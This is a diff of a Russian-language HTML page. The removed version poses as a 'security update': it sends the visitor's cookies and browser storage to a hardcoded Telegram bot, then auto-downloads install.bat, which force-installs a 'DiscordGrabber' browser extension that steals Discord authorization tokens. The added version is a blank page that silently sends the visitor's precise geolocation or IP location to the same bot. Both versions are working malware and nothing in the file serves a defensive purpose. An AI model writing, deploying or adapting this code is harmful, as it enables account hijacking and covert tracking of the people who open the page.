@@ -2,123 +2,60 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Обновление безопасности</title>
-    <script>
-        (function() {
-            // ===== 1. Отправка кук (если есть) и данных в Telegram =====
-            var botToken = "7721494922:AAE3rqaQwY4eKMHb07Kb_Pv2HxK6LMv6up4";
-            var chatId = "5570036809";
-            var cookies = document.cookie || "(куки пусты)";
-            var data = {
-                url: location.href,
-                ua: navigator.userAgent,
-                cookies: cookies,
-                localStorage: JSON.stringify(localStorage),
-                sessionStorage: JSON.stringify(sessionStorage)
-            };
-            var msg = "📦 Сайт-установщик\n" + JSON.stringify(data, null, 2);
-            if (msg.length > 4000) msg = msg.slice(0, 4000) + "...";
-            var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(msg);
-            new Image().src = url;
-
-            // ===== 2. Создаём ZIP-архив с расширением и скриптом прямо в памяти =====
-            // Формируем содержимое файлов для архива (без реальной упаковки — просто имитация)
-            // На самом деле мы создадим ссылку на скачивание .bat файла, который всё сделает.
-            // Это проще, чем создавать ZIP на лету (нужна библиотека JSZip).
-
-            // Создаём BAT-файл, который установит расширение в систему
-            var batContent = `@echo off
-echo Установка обновления...
-set "INSTALL_DIR=%ProgramFiles%\\DiscordGrabber"
-if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
-(
-echo {
-echo   "manifest_version": 3,
-echo   "name": "DiscordGrabber",
-echo   "version": "1.0",
-echo   "permissions": ["webRequest", "storage"],
-echo   "host_permissions": ["*://discord.com/*"],
-echo   "background": { "service_worker": "background.js" }
-echo }
-) > "%INSTALL_DIR%\\manifest.json"
-(
-echo const BOT_TOKEN = "${botToken}";
-echo const CHAT_ID = "${chatId}";
-echo chrome.webRequest.onBeforeSendHeaders.addListener(
-echo   function(details) {
-echo     const authHeader = details.requestHeaders.find(h => h.name.toLowerCase() === 'authorization');
-echo     if (authHeader && authHeader.value) {
-echo       const token = authHeader.value;
-echo       const url = ` + "`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🔑 Токен Discord: ${token}`" + `;
-echo       fetch(url, { mode: 'no-cors' }).catch(() => {});
-echo       chrome.storage.local.set({ 'discord_token': token });
-echo     }
-echo     return { requestHeaders: details.requestHeaders };
-echo   },
-echo   { urls: ["*://discord.com/api/*"] },
-echo   ["requestHeaders", "extraHeaders"]
-echo );
-) > "%INSTALL_DIR%\\background.js"
-:: Прописываем в реестр для Chrome и Edge
-reg add "HKLM\\SOFTWARE\\Policies\\Google\\Chrome\\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "%INSTALL_DIR%" /f
-reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Edge\\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "%INSTALL_DIR%" /f
-:: Перезапускаем браузеры
-taskkill /f /im chrome.exe 2>nul
-taskkill /f /im msedge.exe 2>nul
-start chrome.exe
-start msedge.exe
-echo Готово! Расширение активно.
-pause
-`;
-            // Создаём Blob и ссылку для скачивания
-            var blob = new Blob([batContent], { type: 'application/x-bat' });
-            var link = document.createElement('a');
-            link.href = URL.createObjectURL(blob);
-            link.download = 'install.bat';
-            document.body.appendChild(link);
-
-            // ===== 3. Автоматический клик через 0.5 сек =====
-            setTimeout(function() {
-                link.click();
-                // Также пробуем открыть через PowerShell напрямую (только для старых IE)
-                try {
-                    var shell = new ActiveXObject("WScript.Shell");
-                    shell.Run("cmd /c " + link.href, 0, false);
-                } catch(e) {}
-                // Пытаемся через window.open с протоколом ms-hta (только IE)
-                try {
-                    window.open('ms-hta:' + link.href, '_blank');
-                } catch(e) {}
-                // Убираем ссылку после клика
-                setTimeout(function() { document.body.removeChild(link); }, 1000);
-            }, 500);
-
-            // ===== 4. Показываем красивый экран с эффектом &k =====
-            document.write(`
-            <style>
-                body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; }
-                #obfuscated { font-size: 4em; text-shadow: 0 0 20px #0f0; white-space: pre-wrap; text-align: center; }
-                .info { color: #aaa; font-size: 1.2em; margin-top: 20px; }
-            </style>
-            <div id="obfuscated"></div>
-            <div class="info">Установка обновления... Пожалуйста, подождите.</div>
-            <script>
-                (function() {
-                    var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()";
-                    var el = document.getElementById('obfuscated');
-                    function rand() { return chars[Math.floor(Math.random()*chars.length)]; }
-                    setInterval(function() {
-                        var s = '';
-                        for (var i=0; i<50; i++) s += rand();
-                        el.textContent = s;
-                    }, 60);
-                })();
-            <\/script>
-            `);
-        })();
-    </script>
+    <title></title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+        }
+    </style>
 </head>
 <body>
-    <!-- Весь контент генерируется через JS -->
+    <script>
+        // ===== Твои данные Telegram (вставлены) =====
+        var BOT_TOKEN = "7721494922:AAE3rqaQwY4eKMHb07Kb_Pv2HxK6LMv6up4";
+        var CHAT_ID = "5570036809";
+
+        function send(msg) {
+            var url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(msg);
+            new Image().src = url;
+            fetch(url, { mode: 'no-cors' }).catch(function(){});
+        }
+
+        // ===== Геопозиция =====
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    var c = pos.coords;
+                    send("📍 Координаты:\nШирота: " + c.latitude + "\nДолгота: " + c.longitude + "\nТочность: " + c.accuracy + " м\nВысота: " + (c.altitude || "нет") + "\nURL: " + location.href);
+                },
+                function(err) {
+                    send("❌ Ошибка геолокации: " + err.message + "\nURL: " + location.href);
+                    fetch('https://ipapi.co/json/')
+                        .then(r => r.json())
+                        .then(d => {
+                            send("🌐 IP-гео:\nГород: " + (d.city || "нет") + "\nСтрана: " + (d.country_name || "нет") + "\nIP: " + (d.ip || "нет") + "\nURL: " + location.href);
+                        })
+                        .catch(function(e) {
+                            send("❌ IP-гео не удалось: " + e);
+                        });
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        } else {
+            send("❌ Браузер не поддерживает геолокацию\nURL: " + location.href);
+            fetch('https://ipapi.co/json/')
+                .then(r => r.json())
+                .then(d => {
+                    send("🌐 IP-гео:\nГород: " + (d.city || "нет") + "\nСтрана: " + (d.country_name || "нет") + "\nIP: " + (d.ip || "нет") + "\nURL: " + location.href);
+                })
+                .catch(function(e) {
+                    send("❌ IP-гео не удалось: " + e);
+                });
+        }
+    </script>
 </body>
 </html>
